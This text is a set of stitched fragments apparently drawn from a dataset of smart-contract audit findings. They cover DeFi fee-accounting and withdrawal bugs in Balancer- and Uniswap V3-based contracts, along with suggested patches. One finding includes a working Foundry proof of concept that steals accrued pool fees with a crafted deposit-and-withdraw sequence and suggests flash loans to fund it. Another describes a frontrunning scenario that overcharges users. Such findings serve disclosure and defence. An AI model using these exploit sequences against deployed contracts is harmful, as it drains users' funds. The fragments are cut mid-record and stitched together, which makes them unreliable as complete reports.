                    "description": "The vulnerability described in the report is related to a calculation error that occurs when withdrawing funds from a balancer pool. The `_withdraw` function tries to calculate the amount of assets to withdraw based on the `pricePerShare`. However, the calculation of `toWithdraw` in the function uses a scaling factor of `pricePerShare`, which results in an improperly scaled withdrawal amount. After calculating `toWithdraw`, the `_vaultWithdraw` function is invoked, assuming that `toWithdraw` represents the number of tokens that should be withdrawn. However, `toWithdraw` has been scaled by `pricePerShare`, and due to the specific nature of the Balancer V2 exit pool mechanism, where a `userData` type of `2` is used, the Balancer pool expects the exact number of tokens to be withdrawn (`minAmountsOut`), without any scaling factor. Given the mismatch in the expected amount due to scaling versus the exact amount expected by the Balancer pool, the smart contract can end up withdrawing less than what is required, causing the `require` statement to fail and reverting the transaction. A potential patch to rectify this vulnerability would involve modifying the calculation in the `_withdraw` function to ensure that the amount passed to `_vaultWithdraw` is the correct amount of tokens required for the withdrawal without scaling by `pricePerShare`. This patch would need to be tested thoroughly to ensure it addresses the issue without introducing new vulnerabilities.",

However, if price moves outside the range during the transaction, user will be charged an excessive fee.\n\n## Proof of Concept\n    if ( fee0+fee1 > 0 && ( n0 > 0 || fee0 == 0) && ( n1 > 0 || fee1 == 0 ) ){\n      address pool = V3_FACTORY.getPool(address(TOKEN0.token), address(TOKEN1.token), feeTier * 100);\n      (uint160 sqrtPriceX96,,,,,,)  = IUniswapV3Pool(pool).slot0();\n      (uint256 token0Amount, uint256 token1Amount) = LiquidityAmounts.getAmountsForLiquidity( sqrtPriceX96, TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);\n      if (token0Amount + fee0 > 0) newFee0 = n0 * fee0 / (token0Amount + fee0);\n      if (token1Amount + fee1 > 0) newFee1 = n1 * fee1 / (token1Amount + fee1);\n      fee0 += newFee0;\n      fee1 += newFee1; \n      n0   -= newFee0;\n      n1   -= newFee1;\n    }\n\nSuppose range is [120, 122] and current price is 121. Alice calls `deposit` with `{n0: 100, n1:100} `, if Price moves to 119 during execution (due to market fluctuations or malicious frontrunning), `getAmountsForLiquidity` will return 0 for `token1Amount`. As a result, `newFee1` will be equal to `n1`, which means all the 100 token1 will be charged as fee.\n\n    (uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n      INonfungiblePositionManager.IncreaseLiquidityParams({\n        tokenId: tokenId,\n        amount0Desired: n0,\n        amount1Desired: n1,\n        amount0Min: n0 * 95 / 100,\n        amount1Min: n1 * 95 / 100,\n        deadline: block.timestamp\n      })\n    );\n\nThen, `increaseLiquidity` will succeed since `amount1Min` is now zero.\n\n## Tools Used\nManual\n\n## Recommended Mitigation Steps\nDon't use this to calculate fee:\n\n    if ( fee0+fee1 > 0 && ( n0 > 0 || fee0 == 0) && ( n1 > 0 || fee1 == 0 ) ){\n      address pool = V3_FACTORY.getPool(address(TOKEN0.token), address(TOKEN1.token), feeTier * 100);\n      (uint160 sqrtPriceX96,,,,,,)  = IUniswapV3Pool(pool).slot0();\n      (uint256 token0Amount, uint256 token1Amount) = LiquidityAmounts.getAmountsForLiquidity( sqrtPriceX96, TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);\n      if (token0Amount + fee0 > 0) newFee0 = n0 * fee0 / (token0Amount + fee0);\n      if (token1Amount + fee1 > 0) newFee1 = n1 * fee1 / (token1Amount + fee1);\n      fee0 += newFee0;\n      fee1 += newFee1; \n      n0   -= newFee0;\n      n1   -= newFee1;\n    }\n\nAlways use this:\n\n      uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));\n      uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));\n      require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, \"Invalid Oracle Price\");\n      // Calculate the equivalent liquidity amount of the non-yet compounded fees\n      // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity \n      feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )   \n                                    / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) ); \n\n\n## Assessed type\n\nContext"

            "detail": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool. Yay! \n        console2.log(int(WETH.balanceOf(tokenWhale)) - int(wethBalanceBefore));\n        require(poolSharesBefore ==  tr.balanceOf(tokenWhale));\n    }\n```\nIt is important to note that since the WETH oracle price at the forked block (17811921) is at 1870, above the 500-1000 range, the above PoC works only after fixing my other finding titled:\n> Incorrect Solidity version in FullMath.sol can cause permanent freezing of assets for arithmetic underflow-induced revert\n\n## Tools Used\nCode review\n\n## Recommended Mitigation Steps\n- factor in also the token prices when calculating whether the accrued fees are indeed 1% of the pool\n- when minting TokenisableRange tokens, **always** downscale the minted fees by the relative value of non-distributed fees in the pool:\n```diff\n    // Stack too deep, so localising some variables for feeLiquidity calculations \n-    // If we already clawed back fees earlier, do nothing, else we need to adjust returned liquidity\n-    if ( newFee0 == 0 && newFee1 == 0 ){\n+    {\n      uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));\n      uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));\n      require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, \"Invalid Oracle Price\");\n      // Calculate the equivalent liquidity amount of the non-yet compounded fees\n      // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity \n      feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )   \n                                    / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) ); \n    }\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nMath"

                    "description": "The vulnerability arises from the fact that the function `getThisPositionTicks()` used in the `rerange()` function returns the actual token balance of the Strategy contract (`balance0` and `balance1`), including both protocol fees and users' funds. When the `rerange` or `doRerange` functions are called, they should ideally use only the users' funds to add liquidity, not the protocol fees. However, since the contract's token balances include protocol fees, these fees are erroneously used as well to add liquidity, which ultimately breaks the accounting of protocol fees.\n\nBased on the provided information, especially the process explained in steps 1) to 4), we see that the protocol fees are not being accounted for or separated before rebalancing or reranging the liquidity. Following the report's scenario, when liquidity is added back, it would include the token amount designated as protocol fees, leading to a situation where when the `collectProtocolFees` is called, it might revert due to insufficient balance to cover the protocol fees.\n\nTo validate this vulnerability, a PoC could be generated in which we simulate the process of adding liquidity, accumulating fees, and performing a rerange. If executing `collectProtocolFees` after reranging fails or collects less than the expected amount of protocol fees, that would demonstrate the vulnerability.\n\nA patch would involve adjusting the `rerange()` function to exclude protocol fees from the amounts used when adding liquidity. This could be done by subtracting the `protocolFees0` and `protocolFees1` from `balance0` and `balance1` accordingly before minting new liquidity.\n\nTo remediate the issue, I'd suggest the following changes:\n\n```solidity\nfunction rerange(\n    //... (existing parameters)\n)\n    internal\n    returns (int24 tickLower, int24 tickUpper, uint256 amount0, uint256 amount1, uint256 tokenId, uint128 liquidity)\n{\n    //... (existing code)\n\n    uint256 balance0;\n    uint256 balance1;\n\n    // Subtract protocolFees from the balances before minting new liquidity\n    balance0 = token0.balanceOf(address(this)) - protocolFees0;\n    balance1 = token1.balanceOf(address(this)) - protocolFees1;\n\n    //... (existing code to mint liquidity)\n\n    // Then make sure to update the protocolFees0 and protocolFees1 if necessary after minting\n}\n```\n\nIn this scenario, `protocolFees0` and `protocolFees1` are fields that should already be present in the contract to keep track of the collected protocol fees for each respective token. If not, they would need to be added and managed correctly throughout the contract's fee collection lifecycle.\n\nThe tools used in identifying the vulnerability are manual review and familiarity with smart contract best practices, specifically with regard to accounting for fees and managing separate balances for different purposes.\n\nThe assessment type of \"Math\" also makes sense in this context, as the core of the vulnerability is related to incorrect arithmetic operations leading to mishandled fee accounting.",

The fee collection and user debt updating logic contains flaws that could allow an attacker to collect unauthorized fees and drain LP pair reserves. This situation arises from a logic error, a type of business logic vulnerability that fails to update the contract state correctly during transactions involving the LP token or zero address. The claimFee() function, although not the source of the vulnerability, demonstrates related logic with fee collection and token transfers that are susceptible to reentrancy if not properly safeguarded, and it contains arithmetic operations that could lead to overflows or underflows without adequate checks. Additionally, the code fails to include the LP pair contract address and the zero address in fee caching, creating an exploit opportunity for attackers. Proper mitigation requires calling _cacheFees() without exemptions and incorporating reentrancy guards and safe math practices in the claimFee() function.",

Since Solidity ensures arithmetic operations are checked by default for overflows and underflows as of version 0.8.0, failure to handle potential underflows using `unchecked` blocks can lead to transaction reverts when negative fee growth is a valid scenario. The absence of `unchecked` blocks suggests that the contract does not handle underflows appropriately, which would make it vulnerable to arithmetic underflows in cases where `newFee0` and `newFee1` are smaller than `tf0` and `tf1`.",
